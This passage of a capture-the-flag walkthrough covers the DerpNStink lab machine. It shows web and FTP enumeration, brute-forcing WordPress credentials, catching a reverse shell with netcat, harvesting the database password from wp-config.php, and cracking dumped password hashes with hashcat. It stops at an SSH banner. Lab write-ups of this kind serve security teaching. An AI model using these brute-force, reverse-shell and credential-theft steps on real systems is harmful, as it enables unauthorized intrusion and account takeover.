---- Entering directory: http://derpnstink.local/weblog/wp-includes/js/tinymce/ ----
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/js/tinymce/langs/                                       
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/js/tinymce/plugins/                                     
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/js/tinymce/skins/                                       
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/js/tinymce/themes/                                      
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/js/tinymce/utils/                                       
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/themes/original/css/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/themes/original/img/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/themes/original/jquery/ ----
==> DIRECTORY: http://derpnstink.local/php/phpmyadmin/themes/original/jquery/images/                              
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/js/jquery/ui/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/js/tinymce/langs/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/js/tinymce/plugins/ ----
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/js/tinymce/plugins/hr/                                  
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/js/tinymce/plugins/image/                               
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/js/tinymce/plugins/lists/                               
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/js/tinymce/plugins/media/                               
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/js/tinymce/plugins/wordpress/                           
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/js/tinymce/skins/ ----
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/js/tinymce/skins/wordpress/                             
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/js/tinymce/themes/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/js/tinymce/utils/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/php/phpmyadmin/themes/original/jquery/images/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/js/tinymce/plugins/hr/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/js/tinymce/plugins/image/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/js/tinymce/plugins/lists/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/js/tinymce/plugins/media/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/js/tinymce/plugins/wordpress/ ----
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/js/tinymce/skins/wordpress/ ----
==> DIRECTORY: http://derpnstink.local/weblog/wp-includes/js/tinymce/skins/wordpress/images/                      
                                                                                                                  
---- Entering directory: http://derpnstink.local/weblog/wp-includes/js/tinymce/skins/wordpress/images/ ----
                                                                               ess/images/zt                      
-----------------
END_TIME: Mon Dec 27 04:47:58 2021
DOWNLOADED: 424304 - FOUND: 25
                                                                                                                   
```

### gobuster

```shell
gobuster dir --url http://derpnstink.local -x txt,php,log,bak --wordlist=/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -b 404,403 -q                                                   
/css                  (Status: 301) [Size: 317] [--> http://derpnstink.local/css/]
/index.html           (Status: 200) [Size: 1298]                                  
/javascript           (Status: 301) [Size: 324] [--> http://derpnstink.local/javascript/]
/js                   (Status: 301) [Size: 316] [--> http://derpnstink.local/js/]        
/php                  (Status: 301) [Size: 317] [--> http://derpnstink.local/php/]       
/robots.txt           (Status: 200) [Size: 53]                                           
/robots.txt           (Status: 200) [Size: 53]                                           
/temporary            (Status: 301) [Size: 323] [--> http://derpnstink.local/temporary/] 
/weblog               (Status: 301) [Size: 320] [--> http://derpnstink.local/weblog/]    
                                                                                                                   
```

### feroxbuster

```shell
feroxbuster -q -u http://derpnstink.local -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k
301        9l       28w      320c http://derpnstink.local/weblog
301        9l       28w      317c http://derpnstink.local/php
301        9l       28w      331c http://derpnstink.local/weblog/wp-content
301        9l       28w      317c http://derpnstink.local/css
301        9l       28w      316c http://derpnstink.local/js
301        9l       28w      332c http://derpnstink.local/weblog/wp-includes
301        9l       28w      324c http://derpnstink.local/javascript
301        9l       28w      329c http://derpnstink.local/weblog/wp-admin
301        9l       28w      328c http://derpnstink.local/php/phpmyadmin
301        9l       28w      323c http://derpnstink.local/temporary
403       10l       30w      296c http://derpnstink.local/server-status
Scanning: http://derpnstink.local
Scanning: http://derpnstink.local/weblog
Scanning: http://derpnstink.local/php
Scanning: http://derpnstink.local/css
Scanning: http://derpnstink.local/js
Scanning: http://derpnstink.local/javascript
Scanning: http://derpnstink.local/temporary
^C                                                                                                                   


## FTP

```shell
ftp -p $RHOST 21
Connected to 192.168.56.83.
220 (vsFTPd 3.0.2)
Name (192.168.56.83:f0c1s): anonymous
530 Permission denied.
ftp: Login failed
ftp> exit
221 Goodbye.
                                                                                                                   
```

```shell
ftp -p $RHOST 21
Connected to 192.168.56.83.
220 (vsFTPd 3.0.2)
Name (192.168.56.83:f0c1s): stinky
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
ftp> exi
221 Goodbye.
                                                                                                                   
```

```shell
hydra -l stinky -P cewl.txt $RHOST ftp                         
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-27 04:51:02
[DATA] max 16 tasks per 1 server, overall 16 tasks, 129 login tries (l:1/p:129), ~9 tries per task
[DATA] attacking ftp://192.168.56.83:21/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-27 04:51:32
                                                                                                                   
```

## Information in images?

```shell
exiftool derp.png 
ExifTool Version Number         : 12.36
File Name                       : derp.png
Directory                       : .
File Size                       : 106 KiB
File Modification Date/Time     : 2021:12:27 05:00:23+05:30
File Access Date/Time           : 2021:12:27 05:00:23+05:30
File Inode Change Date/Time     : 2021:12:27 05:00:23+05:30
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 146
Image Height                    : 523
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Pixels Per Unit X               : 2835
Pixels Per Unit Y               : 2835
Pixel Units                     : meters
Profile Name                    : Photoshop ICC profile
Profile CMM Type                : Linotronic
Profile Version                 : 2.1.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 1998:02:09 06:49:00
Profile File Signature          : acsp
Primary Platform                : Microsoft Corporation
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : Hewlett-Packard
Device Model                    : sRGB
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Media-Relative Colorimetric
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Hewlett-Packard
Profile ID                      : 0
Profile Copyright               : Copyright (c) 1998 Hewlett-Packard Company
Profile Description             : sRGB IEC61966-2.1
Media White Point               : 0.95045 1 1.08905
Media Black Point               : 0 0 0
Red Matrix Column               : 0.43607 0.22249 0.01392
Green Matrix Column             : 0.38515 0.71687 0.09708
Blue Matrix Column              : 0.14307 0.06061 0.7141
Device Mfg Desc                 : IEC http://www.iec.ch
Device Model Desc               : IEC 61966-2.1 Default RGB colour space - sRGB
Viewing Cond Desc               : Reference Viewing Condition in IEC61966-2.1
Viewing Cond Illuminant         : 19.6445 20.3718 16.8089
Viewing Cond Surround           : 3.92889 4.07439 3.36179
Viewing Cond Illuminant Type    : D50
Luminance                       : 76.03647 80 87.12462
Measurement Observer            : CIE 1931
Measurement Backing             : 0 0 0
Measurement Geometry            : Unknown
Measurement Flare               : 0.999%
Measurement Illuminant          : D65
Technology                      : Cathode Ray Tube Display
Red Tone Reproduction Curve     : (Binary data 2060 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 2060 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 2060 bytes, use -b option to extract)
XMP Toolkit                     : Adobe XMP Core 5.6-c067 79.157747, 2015/03/30-23:40:42
Creator Tool                    : Adobe Photoshop CC 2015 (Windows)
Create Date                     : 2015:10:25 19:21:29-04:00
Metadata Date                   : 2015:10:25 19:21:29-04:00
Modify Date                     : 2015:10:25 19:21:29-04:00
Instance ID                     : xmp.iid:5c7941ca-962b-944d-9ef9-2c736c943a69
Document ID                     : adobe:docid:photoshop:156c1cf7-7b6f-11e5-914a-a2752e39dbcb
Original Document ID            : xmp.did:92660939-e319-0443-a1d6-cec782232e3f
History Action                  : created, saved
History Instance ID             : xmp.iid:92660939-e319-0443-a1d6-cec782232e3f, xmp.iid:5c7941ca-962b-944d-9ef9-2c736c943a69
History When                    : 2015:10:25 19:21:29-04:00, 2015:10:25 19:21:29-04:00
History Software Agent          : Adobe Photoshop CC 2015 (Windows), Adobe Photoshop CC 2015 (Windows)
History Changed                 : /
Format                          : image/png
Color Mode                      : RGB
ICC Profile Name                : sRGB IEC61966-2.1
Orientation                     : Horizontal (normal)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Color Space                     : sRGB
Exif Image Width                : 146
Exif Image Height               : 523
White Point X                   : 0.31269
White Point Y                   : 0.32899
Red X                           : 0.63999
Red Y                           : 0.33001
Green X                         : 0.3
Green Y                         : 0.6
Blue X                          : 0.15
Blue Y                          : 0.05999
Image Size                      : 146x523
Megapixels                      : 0.076
                                                                                                                   
```

```shell
exiftool stinky.png       
ExifTool Version Number         : 12.36
File Name                       : stinky.png
Directory                       : .
File Size                       : 217 KiB
File Modification Date/Time     : 2021:12:27 05:00:27+05:30
File Access Date/Time           : 2021:12:27 05:00:27+05:30
File Inode Change Date/Time     : 2021:12:27 05:00:27+05:30
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 392
Image Height                    : 517
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Background Color                : 255 255 255
Pixels Per Unit X               : 72
Pixels Per Unit Y               : 72
Pixel Units                     : Unknown
Warning                         : [minor] Text/EXIF chunk(s) found after PNG IDAT (may be ignored by some readers)
Datecreate                      : 2017-07-07T06:50:44-05:00
Datemodify                      : 2017-07-07T06:50:44-05:00
Image Size                      : 392x517
Megapixels                      : 0.203
                                                                                                                   
```


```shell
exiftool -b stinky.png
Warning: [minor] Text/EXIF chunk(s) found after PNG IDAT (may be ignored by some readers) - stinky.png
12.36stinky.png.2220452021:12:27 05:00:27+05:302021:12:27 05:01:00+05:302021:12:27 05:00:27+05:30100644PNGPNGimage/png39251786000255 255 25572720[minor] Text/EXIF chunk(s) found after PNG IDAT (may be ignored by some readers)2017-07-07T06:50:44-05:002017-07-07T06:50:44-05:00392 5170.202664                                                                                                                   
```

No. There is no information in the images.

All we have so far is one username: stinky; that requires password for FTP.

## Finally a clue...

![8.can-you-find-the-clue](8.can-you-find-the-clue.png)

`view-source:http://derpnstink.local/webnotes/info.txt`

```
<-- @stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live --> 
```

Yeah I figured this already.

### more clues in code?

![9.weird-links-that-go-nowhere](9.weird-links-that-go-nowhere.png)

Links:

- http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php
- http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/elidumfy.php
- http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/uoukbgmr.php

May be fuzz it;
ffuf fails...
gobuster goes and finds /cache, alas it is forbidden.

Words:

- h0m3l4b1t
- randonx

These can be passwords or directories...

And then there is code that supposedly imports CSS

```html
@import url('http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/views/default/css-responsive.php?layout=responsive&resheight=30&resheighttype=%25&resizeimages=N&width=450&height=250&border=1px+solid+%23CCCCCC&background=%23000000&infobackground=%23000000&infocolor=%23ffffff&thumbactive=&unique=custom&wrapperid=slideshow-wrappercustom&autoheight=false&thumbwidth=100&thumbheight=75&sliderwidth=625&infohideonmobile=1');
```

### gobuster

```shell
gobuster dir --url http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/ -x js,png,py,txt,php,log,bak --wordlist=/usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -b 404,403 -q 
/cache                (Status: 301) [Size: 363] [--> http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/cache/]
                                                                                                                                                                                                                                           
```

```shell
gobuster dir --url http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/views/default/ -x js,png,py,txt,php,log,bak --wordlist=/usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -b 404,403 -q
/images               (Status: 301) [Size: 378] [--> http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/views/default/images/]
/css.php              (Status: 200) [Size: 6]                                                                                                  
/gallery.php          (Status: 500) [Size: 0]                                                                                                  
                                                                                                                                                                                                                                           
```

```shell
gobuster dir --url http://derpnstink.local/weblog/ -x js,png,py,txt,php,log,bak --wordlist=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -b 404,403 -q                   
/index.php            (Status: 301) [Size: 0] [--> http://derpnstink.local/weblog/]
/wp-content           (Status: 301) [Size: 331] [--> http://derpnstink.local/weblog/wp-content/]
/license.txt          (Status: 200) [Size: 19935]                                               
/wp-login.php         (Status: 200) [Size: 2721]                                                
/wp-includes          (Status: 301) [Size: 332] [--> http://derpnstink.local/weblog/wp-includes/]
/wp-admin             (Status: 301) [Size: 329] [--> http://derpnstink.local/weblog/wp-admin/]   
/xmlrpc.php           (Status: 405) [Size: 42]                                                   
/wp-signup.php        (Status: 302) [Size: 0] [--> http://derpnstink.local/weblog/wp-login.php?action=register]
                                                                                                                   
```


## wpscan

```shell
wpscan --url http://derpnstink.local/weblog --api-token="$WP_API_TOKEN" --enumerate ap,at,cb,dbe,u
...                                                                                                                                                                                                                                           
```

[Check 10.out-wpscan.txt for output](10.out-wpscan.txt)



### brute forcing with rockyou.txt

```shell
wpscan --url http://derpnstink.local/weblog --api-token="$WP_API_TOKEN" --enumerate ap,at,cb,dbe,u -U admin --passwords /usr/share/wordlists/rockyou.txt
...
[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / admin                                                                                          
Trying admin / VINCENT Time: 00:04:27 <                                  > (19820 / 14364212)  0.13%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: admin

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 5
 | Requests Remaining: 15

[+] Finished: Mon Dec 27 13:50:06 2021
[+] Requests Done: 43530
[+] Cached Requests: 20
[+] Data Sent: 16.945 MB
[+] Data Received: 15.92 MB
[+] Memory used: 308.695 MB
[+] Elapsed time: 00:04:57
```

Found credentials admin:admin

Also, the link `http://derpnstink.local/weblog/wp-login.php?action=register` takes to `http://derpnstink.local/weblog/wp-login.php?action=register`

Basically registration is disabled.

## Reverse shell

Upload a reverse shell via homelabit.

```shell
```shell
nc -nlvp 4444 -s $LHOST     
Listening on 192.168.56.70 4444
Connection received on 192.168.56.83 39774
Linux DeRPnStiNK 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
 08:57:58 up  1:00,  0 users,  load average: 0.00, 0.90, 1.63
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ date
Mon Dec 27 10:50:19 EST 2021
$ hostname
DeRPnStiNK
$ pwd
/
www-data@DeRPnStiNK:/var/www/html$ ls -la     
ls -la
total 372
drwxr-xr-x 8 nobody   nogroup   4096 Nov 12  2017 .
drwxr-xr-x 3 root     root      4096 Nov 11  2017 ..
-rw-r--r-- 1 root     root        18 Nov 12  2017 .htaccess
drwxr-xr-x 2 root     root      4096 Nov 11  2017 css
-rw-r--r-- 1 root     root    108987 Nov 11  2017 derp.png
-rw-r--r-- 1 root     root      1298 Nov 12  2017 index.html
drwxr-xr-x 2 root     root      4096 Nov 11  2017 js
drwxr-xr-x 2 root     root      4096 Nov 11  2017 php
-rw-r--r-- 1 root     root        53 Nov 11  2017 robots.txt
-rw-r--r-- 1 root     root    222045 Nov 11  2017 stinky.png
drwxrwxrwx 2 root     root      4096 Nov 12  2017 temporary
drwxr-xr-x 5 www-data root      4096 Dec 12  2017 weblog
drwxr-xr-x 2 root     root      4096 Jan  9  2018 webnotes
```

### backups

```shell
www-data@DeRPnStiNK:/var/www/html$ find / -type f -name "*bak" -exec ls -lh "{}" \; 2>/dev/null
<w/html$ find / -type f -name "*bak" -exec ls -lh "{}" \; 2>/dev/null        
-rw------- 1 root shadow 728 Nov 12  2017 /var/backups/gshadow.bak
-rw------- 1 root shadow 1.4K Nov 12  2017 /var/backups/shadow.bak
-rw------- 1 root root 2.1K Nov 12  2017 /var/backups/passwd.bak
-rw------- 1 root root 886 Nov 12  2017 /var/backups/group.bak
www-data@DeRPnStiNK:/var/www/html$ find / -type f -name "*backup*" 2>/dev/null
<w/html$ find / -type f -name "*backup*" 2>/dev/null                         
/usr/src/linux-headers-4.4.0-31-generic/include/config/wm831x/backup.h
/usr/src/linux-headers-4.4.0-31-generic/include/config/net/team/mode/activebackup.h
/usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
/usr/share/help-langpack/en_AU/deja-dup/backup-first.page
/usr/share/help-langpack/en_AU/deja-dup/backup-auto.page
/usr/share/help-langpack/en_AU/ubuntu-help/backup-what.page
/usr/share/help-langpack/en_AU/ubuntu-help/backup-why.page
/usr/share/help-langpack/en_AU/ubuntu-help/backup-frequency.page
/usr/share/help-langpack/en_AU/ubuntu-help/backup-check.page
/usr/share/help-langpack/en_AU/ubuntu-help/backup-restore.page
/usr/share/help-langpack/en_AU/ubuntu-help/backup-where.page
/usr/share/help-langpack/en_AU/ubuntu-help/backup-thinkabout.page
/usr/share/help-langpack/en_AU/ubuntu-help/backup-how.page
/usr/share/help-langpack/en_GB/evolution/backup-restore.page
/usr/share/help-langpack/en_GB/deja-dup/backup-first.page
/usr/share/help-langpack/en_GB/deja-dup/backup-auto.page
/usr/share/help-langpack/en_GB/ubuntu-help/backup-what.page
/usr/share/help-langpack/en_GB/ubuntu-help/backup-why.page
/usr/share/help-langpack/en_GB/ubuntu-help/backup-frequency.page
/usr/share/help-langpack/en_GB/ubuntu-help/backup-check.page
/usr/share/help-langpack/en_GB/ubuntu-help/backup-restore.page
/usr/share/help-langpack/en_GB/ubuntu-help/backup-where.page
/usr/share/help-langpack/en_GB/ubuntu-help/backup-thinkabout.page
/usr/share/help-langpack/en_GB/ubuntu-help/backup-how.page
/usr/share/help-langpack/en_CA/ubuntu-help/backup-what.page
/usr/share/help-langpack/en_CA/ubuntu-help/backup-why.page
/usr/share/help-langpack/en_CA/ubuntu-help/backup-frequency.page
/usr/share/help-langpack/en_CA/ubuntu-help/backup-check.page
/usr/share/help-langpack/en_CA/ubuntu-help/backup-restore.page
/usr/share/help-langpack/en_CA/ubuntu-help/backup-where.page
/usr/share/help-langpack/en_CA/ubuntu-help/backup-thinkabout.page
/usr/share/help-langpack/en_CA/ubuntu-help/backup-how.page
/usr/share/help/C/gnome-help/backup-what.page
/usr/share/help/C/gnome-help/backup-why.page
/usr/share/help/C/gnome-help/backup-frequency.page
/usr/share/help/C/gnome-help/backup-check.page
/usr/share/help/C/gnome-help/backup-restore.page
/usr/share/help/C/gnome-help/backup-where.page
/usr/share/help/C/gnome-help/backup-thinkabout.page
/usr/share/help/C/gnome-help/backup-how.page
/usr/share/help/C/deja-dup/backup-first.page
/usr/share/help/C/deja-dup/backup-auto.page
/usr/share/help/C/ubuntu-help/backup-what.page
/usr/share/help/C/ubuntu-help/backup-why.page
/usr/share/help/C/ubuntu-help/backup-frequency.page
/usr/share/help/C/ubuntu-help/backup-check.page
/usr/share/help/C/ubuntu-help/backup-restore.page
/usr/share/help/C/ubuntu-help/backup-where.page
/usr/share/help/C/ubuntu-help/backup-thinkabout.page
/usr/share/help/C/ubuntu-help/backup-how.page
/usr/share/doc/duplicity/examples/system-backup.gz
/usr/share/doc/libipc-system-simple-perl/examples/rsync-backup.pl
/usr/share/app-install/icons/kbackup.png
/usr/share/app-install/icons/_usr_share_pixmaps_luckybackup.png
/usr/share/app-install/desktop/nepomuk-core-data:kde4__nepomukbackup.desktop
/usr/share/app-install/desktop/kbackup:kde4__kbackup.desktop
/usr/share/app-install/desktop/luckybackup:luckybackup.desktop
/usr/share/app-install/desktop/barrybackup-gui:barrybackup.desktop
/usr/share/app-install/desktop/slbackup-php:slbackup-php.desktop
/lib/modules/4.4.0-31-generic/kernel/drivers/power/wm831x_backup.ko
/lib/modules/4.4.0-31-generic/kernel/drivers/net/team/team_mode_activebackup.ko
www-data@DeRPnStiNK:/var/www/html$ find / -type d -name "*backup*" 2>/dev/null
<w/html$ find / -type d -name "*backup*" 2>/dev/null                         
/var/backups
/var/cache/dbconfig-common/backups
```

### /home

```shell
www-data@DeRPnStiNK:/home$ ls -lAhR   
ls -lAhR
.:
total 8.0K
drwx------ 10 mrderp mrderp 4.0K Jan  9  2018 mrderp
drwx------ 12 stinky stinky 4.0K Jan  9  2018 stinky
ls: cannot open directory ./mrderp: Permission denied
ls: cannot open directory ./stinky: Permission denied
```

### SUID and SGID binaries

```shell
www-data@DeRPnStiNK:/home$ find / -type f -perm -4000 -exec ls -la "{}" \; 2>/dev/null
<find / -type f -perm -4000 -exec ls -la "{}" \; 2>/dev/null                 
-rwsr-xr-x 1 root root 88752 Sep  2  2015 /bin/mount
-rwsr-xr-x 1 root root 30112 May 15  2015 /bin/fusermount
-rwsr-xr-x 1 root root 35300 Jan 26  2016 /bin/su
-rwsr-xr-x 1 root root 43316 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 67704 Sep  2  2015 /bin/umount
-rwsr-xr-x 1 root root 38932 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 72860 Oct 21  2013 /usr/bin/mtr
-rwsr-xr-x 1 root root 156708 Aug 27  2015 /usr/bin/sudo
-rwsr-xr-x 1 root root 18168 Nov 24  2015 /usr/bin/pkexec
-rwsr-xr-x 1 root root 30984 Jan 26  2016 /usr/bin/newgrp
-rwsr-xr-x 1 root root 45420 Jan 26  2016 /usr/bin/passwd
-rwsr-xr-x 1 root lpadmin 13672 Dec 11  2015 /usr/bin/lppasswd
-rwsr-xr-x 1 root root 18136 May  7  2014 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 66284 Jan 26  2016 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 35916 Jan 26  2016 /usr/bin/chsh
-rwsr-xr-x 1 root root 44620 Jan 26  2016 /usr/bin/chfn
-rwsr-sr-x 1 libuuid libuuid 17996 Sep  2  2015 /usr/sbin/uuidd
-rwsr-xr-- 1 root dip 323000 Apr 21  2015 /usr/sbin/pppd
-rwsr-xr-x 1 root root 13840 Jun 22  2016 /usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox
-rwsr-xr-x 1 root root 9808 Nov 24  2015 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 5480 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 333952 Nov 25  2014 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 492972 Aug 11  2016 /usr/lib/openssh/ssh-keysign
www-data@DeRPnStiNK:/home$ 

www-data@DeRPnStiNK:/home$ find / -type f -perm -2000 -exec ls -la "{}" \; 2>/dev/null
<find / -type f -perm -2000 -exec ls -la "{}" \; 2>/dev/null                 
-rwxr-sr-x 1 root shadow 30432 Mar 16  2016 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 18208 Jan 26  2016 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 329144 Aug 11  2016 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 53516 Jan 26  2016 /usr/bin/chage
-rwxr-sr-x 1 root mlocate 34452 Jun 20  2013 /usr/bin/mlocate
-rwxr-sr-x 1 root crontab 34824 Feb  9  2013 /usr/bin/crontab
-rwxr-sr-x 1 root mail 9704 Dec  3  2012 /usr/bin/mail-unlock
-rwxr-sr-x 1 root tty 9748 Jun  4  2013 /usr/bin/bsd-write
-rwxr-sr-x 1 root mail 13960 Dec  6  2013 /usr/bin/dotlockfile
-rwxr-sr-x 1 root mail 9704 Dec  3  2012 /usr/bin/mail-lock
-rwxr-sr-x 1 root mail 9704 Dec  3  2012 /usr/bin/mail-touchlock
-rwxr-sr-x 1 root tty 18056 Sep  2  2015 /usr/bin/wall
-rwsr-sr-x 1 libuuid libuuid 17996 Sep  2  2015 /usr/sbin/uuidd
-rwxr-sr-x 1 root mail 13888 Oct 20  2014 /usr/lib/evolution/camel-lock-helper-1.2
-rwxr-sr-x 1 root utmp 9468 Oct  5  2012 /usr/lib/utempter/utempter
-rwxr-sr-x 1 root utmp 14004 Oct 21  2015 /usr/lib/libvte-2.90-9/gnome-pty-helper
```

### mysql password

```shell
www-data@DeRPnStiNK:/var/www/html/weblog$ grep -C5 -i password wp-config.php
grep -C5 -i password wp-config.php
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'mysql');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
www-data@DeRPnStiNK:/var/www/html/weblog$
```

Credentials `root:mysql`

## mysql

```shell
mysql> select * from wp_users;
select * from wp_users;
+----+-------------+------------------------------------+---------------+------------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+-------+
| ID | user_login  | user_pass                          | user_nicename | user_email                   | user_url | user_registered     | user_activation_key                           | user_status | display_name | flag2 |
+----+-------------+------------------------------------+---------------+------------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+-------+
|  1 | unclestinky | $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41 | unclestinky   | unclestinky@DeRPnStiNK.local |          | 2017-11-12 03:25:32 | 1510544888:$P$BQbCmzW/ICRqb1hU96nIVUFOlNMKJM1 |           0 | unclestinky  |       |
|  2 | admin       | $P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/ | admin         | admin@derpnstink.local       |          | 2017-11-13 04:29:35 |                                               |           0 | admin        |       |
+----+-------------+------------------------------------+---------------+------------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+-------+
2 rows in set (0.00 sec)
```

## cracking passwords

```shell
cat derpnstink-1.wp.hashes        
$P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/
$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41



hashcat -w3 -m400 -a0 -o cracked.derpnstink-1.wp.hashes derpnstink-1.wp.hashes /usr/share/wordlists/rockyou.txt
...
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344410
* Bytes.....: 139921705
* Keyspace..: 14344403
* Runtime...: 1 sec

                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: phpass
Hash.Target......: derpnstink-1.wp.hashes
Time.Started.....: Mon Dec 27 16:05:57 2021 (2 secs)
Time.Estimated...: Mon Dec 27 16:05:59 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1377.7 kH/s (59.51ms) @ Accel:32 Loops:1024 Thr:1024 Vec:1
Recovered........: 2/2 (100.00%) Digests, 2/2 (100.00%) Salts
Progress.........: 5767168/28688806 (20.10%)
Rejected.........: 0/5767168 (0.00%)
Restore.Point....: 2162688/14344403 (15.08%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:7168-8192
Candidates.#1....: Angelo16 -> vin0304
Hardware.Mon.#1..: Temp: 53c Fan: 32% Util: 93% Core:1965MHz Mem:6801MHz Bus:16

Started: Mon Dec 27 16:05:53 2021
Stopped: Mon Dec 27 16:06:00 2021



cat cracked.derpnstink-1.wp.hashes 
$P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/:admin
$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41:wedgie57
```

## SSH

cannot.

```shell
```shell
ssh stinky@$RHOST            
The authenticity of host '192.168.56.83 (192.168.56.83)' can't be established.
ED25519 key fingerprint is SHA256:4Qn5hPeQwj5Ukq/WfZZgN06jXA62NhogxRNpgEs2c4c.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.83' (ED25519) to the list of known hosts.
Ubuntu 14.04.5 LTS


                       ,~~~~~~~~~~~~~..
                       '  Derrrrrp  N  `
        ,~~~~~~,       |    Stink      | 
       / ,      \      ',  ________ _,"
      /,~|_______\.      \/
     /~ (__________)   
    (*)  ; (^)(^)':
        =;  ____  ;
          ; """"  ;=
